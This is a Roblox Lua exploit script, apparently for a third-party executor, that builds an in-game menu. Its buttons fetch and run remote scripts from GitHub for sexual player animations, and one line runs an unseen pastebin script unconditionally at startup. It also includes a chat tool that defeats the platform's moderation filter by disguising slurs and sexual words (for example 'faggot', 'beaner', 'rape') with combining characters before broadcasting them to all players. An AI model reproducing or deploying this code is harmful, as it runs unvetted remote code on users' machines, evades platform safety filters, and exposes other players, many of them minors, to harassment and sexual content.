local gui = Instance.new("ScreenGui")
gui.Name = "patrickGui"
gui.Parent = game.CoreGui

--///patrick gui maker///--



--[[ 
 Beta Test

Have A Sex🥵🍆👌💦

MY SCRIPT MY RULE, SKID? I DONT CARE

credit: animatrix

FE-Sus-Player-Animation > Loader

]]

local function ssa(a)
        local ____st = Instance.new("UIStroke")
        ____st.Color = Color3.new(0, 0, 0)
        ____st.Thickness = 1
        ____st.Parent = a
end

-- #topbar
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.2, 0, 0.04, 0)
frame.Position = UDim2.new(0.3, 0, 0.1, 0)
frame.BackgroundColor3 = Color3.new(0,0.2,0.3)
frame.BorderColor3 = Color3.new(0, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.BackgroundTransparency = 0 
frame.Draggable = true
frame.Parent = gui

local label = Instance.new("TextLabel")
label.Size = UDim2.new(0.4, 0, 0.6, 0)
label.Position = UDim2.new(0, 0, 0.2, 0)
label.BackgroundColor3 = Color3.new(0, 0, 0)
label.BorderColor3 = Color3.new(0, 0, 0)
label.BorderSizePixel = 0
label.Text = "FESP-A V1.05"
label.TextColor3 = Color3.new(255, 255, 255)
label.BackgroundTransparency = 1
label.Font = Enum.Font.RobotoMono
label.TextScaled = true
label.Parent = frame

local textbutton = Instance.new("TextButton")
textbutton.Size = UDim2.new(0.07, 0, 0.6, 0)
textbutton.Position = UDim2.new(0.9, 0, 0.2, 0)
textbutton.BackgroundColor3 = Color3.new(0, 0.3, 0.7)
textbutton.BorderColor3 = Color3.new(0, 0, 0)
textbutton.BorderSizePixel = 1
textbutton.Text = "VI"
textbutton.TextColor3 = Color3.new(255, 255, 255)
textbutton.BackgroundTransparency = 0
textbutton.Font = Enum.Font.FredokaOne
textbutton.TextScaled = true
textbutton.Parent = frame

-- #main_frame
local frame2 = Instance.new("Frame")
frame2.Size = UDim2.new(1, 0, 10, 0)
frame2.Position = UDim2.new(0, 0, 1, 0)
frame2.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
frame2.BorderColor3 = Color3.new(0, 0, 0)
frame2.BorderSizePixel = 0
frame2.Active = true
frame2.BackgroundTransparency = 0
frame2.Parent = frame

local userlabel = Instance.new("TextLabel")
userlabel.Size = UDim2.new(1, 0, 0.05, 0)
userlabel.Position = UDim2.new(0, 0, 0, 0)
userlabel.BackgroundColor3 = Color3.new(0, 0, 0)
userlabel.BorderColor3 = Color3.new(0, 0, 0)
userlabel.BorderSizePixel = 0
userlabel.Text = "Created using Gui Maker, Animatrix"
userlabel.TextColor3 = Color3.new(255, 255, 255)
userlabel.BackgroundTransparency = 0
userlabel.Font = Enum.Font.RobotoMono
userlabel.TextScaled = true
userlabel.Parent = frame2

local uiframe = Instance.new("Frame")
uiframe.Size = UDim2.new(0.5, 0, 0.85, 0)
uiframe.Position = UDim2.new(0.05, 0, 0.1, 0)
uiframe.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
uiframe.BorderColor3 = Color3.new(0, 0, 0)
uiframe.BorderSizePixel = 0
uiframe.Active = true
uiframe.BackgroundTransparency = 0
uiframe.Parent = frame2

local scrolling = Instance.new("ScrollingFrame")
scrolling.Size = UDim2.new(0.8, 0, 0.9, 0)
scrolling.Position = UDim2.new(0.1, 0, 0.05, 0)
scrolling.BackgroundColor3 = Color3.new(1, 1, 1)
scrolling.BorderColor3 = Color3.new(0, 0, 0)
scrolling.BorderSizePixel = 0
scrolling.Parent = uiframe
scrolling.CanvasSize = UDim2.new(0,0,7,0)
scrolling.BackgroundTransparency = 1
scrolling.ScrollBarThickness = 0

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 3)
UIListLayout.Parent = scrolling

local respawn = Instance.new("TextButton")
respawn.Size = UDim2.new(0.35, 0, 0.05, 0)
respawn.Position = UDim2.new(0.6, 0, 0.1, 0)
respawn.BackgroundColor3 = Color3.new(0, 0.3, 0.7)
respawn.BorderColor3 = Color3.new(0, 0, 0)
respawn.BorderSizePixel = 1
respawn.Text = "Respawn"
respawn.TextColor3 = Color3.new(255, 255, 255)
respawn.BackgroundTransparency = 0
respawn.Font = Enum.Font.RobotoMono
respawn.TextScaled = true
respawn.Parent = frame2

local chatbox = Instance.new("TextBox")
chatbox.Size = UDim2.new(1, 0, 1.5, 0)
chatbox.Position = UDim2.new(0, 0, 2, 0)
chatbox.BackgroundColor3 = Color3.new(0.25, 0.25, 0.25)
chatbox.BorderColor3 = Color3.new(0, 0, 0)
chatbox.BorderSizePixel = 1
chatbox.Text = ""
chatbox.PlaceholderText = "Enter Chat"
chatbox.TextColor3 = Color3.new(1,1,1)
chatbox.BackgroundTransparency = 0
chatbox.Font = Enum.Font.RobotoMono
chatbox.TextWrapped = true
chatbox.ClearTextOnFocus = false
chatbox.TextScaled = true
chatbox.TextXAlignment = Enum.TextXAlignment.Left
chatbox.TextSize = 15
chatbox.Parent = respawn

local chatbutton = Instance.new("TextButton")
chatbutton.Size = UDim2.new(1, 0, 0.7, 0)
chatbutton.Position = UDim2.new(0, 0, 1.2, 0)
chatbutton.BackgroundColor3 = Color3.new(0, 0.3, 0.7)
chatbutton.BorderColor3 = Color3.new(0, 0, 0)
chatbutton.BorderSizePixel = 1
chatbutton.Text = "Send to chat"
chatbutton.TextColor3 = Color3.new(255, 255, 255)
chatbutton.BackgroundTransparency = 0
chatbutton.Font = Enum.Font.RobotoMono
chatbutton.TextScaled = true
chatbutton.Parent = chatbox

textbutton.MouseButton1Click:Connect(function()
        frame2.Visible = not frame2.Visible
end)

respawn.MouseButton1Click:Connect(function()
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

local function load(name,script)

local ____1 = Instance.new("Frame")
____1.Size = UDim2.new(1, 0, 0.01, 0)
____1.Position = UDim2.new(0.5, 0, 0.5, 0)
____1.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
____1.BorderColor3 = Color3.new(0, 0, 0)
____1.BorderSizePixel = 0
____1.Active = true
____1.BackgroundTransparency = 0
____1.Parent = scrolling

ssa(____1)

local ____2 = Instance.new("TextLabel")
____2.Size = UDim2.new(0.8, 0, 1, 0)
____2.Position = UDim2.new(0, 0, 0, 0)
____2.BackgroundColor3 = Color3.new(0, 0, 0)
____2.BorderColor3 = Color3.new(0, 0, 0)
____2.BorderSizePixel = 0
____2.Text = name
____2.TextColor3 = Color3.new(255, 255, 255)
____2.BackgroundTransparency = 1
____2.Font = Enum.Font.RobotoMono
____2.TextScaled = true
____2.TextWrapped = true
____2.TextXAlignment = Enum.TextXAlignment.Left
____2.Parent = ____1

local ____3 = Instance.new("TextButton")
____3.Size = UDim2.new(0.2, 0, 1, 0)
____3.Position = UDim2.new(0.8, 0, 0, 0)
____3.BackgroundColor3 = Color3.new(0, 0.3, 0.7)
____3.BorderColor3 = Color3.new(0, 0, 0)
____3.BorderSizePixel = 1
____3.Text = "load"
____3.TextColor3 = Color3.new(255, 255, 255)
____3.BackgroundTransparency = 0
____3.Font = Enum.Font.RobotoMono
____3.TextScaled = true
____3.Parent = ____1

____3.MouseButton1Click:Connect(function()
        loadstring(game:HttpGet(script))()
end)

end

local function __a(input)
local list_ = {
[" "]="",i="ı̇",I="I̱",hentai="heṉtai",Hentai="Heṉtai",HENTAI="HEṈTAI",rape="ṟape",Rape="Ṟape",RAPE="ṞAPE",boob="bo̱ob",Boob="Bo̱ob",BOOB="BO̱OB",xxx="x̱xx",Xxx="X̱xx",XXX="X̱XX",sex="s̱ex",Sex="S̱ex",SEX="S̱EX",cock="c̱ock",Cock="C̱ock",COCK="C̱OCK", porn="p̱orn",Porn="P̱orn",PORN="P̱ORN",pussy="p̱ussy",Pussy="P̱ussy",PUSSY="P̱USSY",horny="ẖorny",Horny="H̱orny",HORNY="H̱ORNY",slut="s̱lut",Slut="S̱lut",SLUT="S̱LUT",cunt="c̱unt",Cunt="C̱unt",CUNT="C̱UNT",booty="ḇooty",Booty="Ḇooty",BOOTY="ḆOOTY",semen="s̱emen",Semen="S̱emen",SEMEN="S̱EMEN",condom="c̱omdom",Condom="C̱ondom",CONDOM="C̱ONDOM",mastur="m̱astur",Mastur="M̱astur",MASTUR="M̱ASTUR",slave="s̱lave",Slave="S̱lave",SLAVE="S̱LAVE",youtube="y̱outube",YouTuber="Y̱outube",YOUTUBE="Y̱OUTUBE",faggot="fag̱got",Faggot="Fag̱got",FAGGOT="FAG̱GOT",suck="s̱uck",Suck="S̱uck",SUCK="S̱UCK",beaner="ḇeaner",Beaner="Ḇeaner",BEANER="ḆEANER",kkk="ḵkk",Kkk="Ḵkk",KKK="ḴKK",nsfw="ṉsfw",Nsfw="Ṉsfw",NSFW="ṈSFW",naked="ṉaked",Naked="Ṉaked",NAKED="ṈAKED",butt="ḇutt",Butt="Ḇutt",BUTT="ḆUTT",facebook="f̱acebook",Facebook="F̱acebook",FACEBOOK="F̱ACEBOOK", retard="ṟetard",Retard="Ṟetard",RETARD="ṞETARD",
}
    for original, replacement in pairs(list_) do
        input = input:gsub(original, replacement)
    end

    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local DefaultChatSystemChatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")

    if DefaultChatSystemChatEvents then
        local SayMessageRequest = DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if SayMessageRequest then
            SayMessageRequest:FireServer("" .. input.."", "All")
        end
    else
        local TextChatService = game:GetService("TextChatService")
        local ChatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if ChatChannel then
            ChatChannel:SendAsync("" .. input.."")
        end
    end
end

chatbutton.MouseButton1Click:Connect(function()
    local inputText = chatbox.Text
    __a(inputText)
end)

-- fix
loadstring(game:HttpGet("https://pastebin.com/raw/hq9FKvrC"))()

load("Normal Sex v1","https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/SX-V1.lua")
load("Normal Sex v2","https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/SX-V2.lua")
load("Lay Down Sex","https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/LAYDOWN.lua")
load("BetterBang","https://raw.githubusercontent.com/AlgariBot/lua/refs/heads/Lua-Script-Executor/BetARBang.lua")
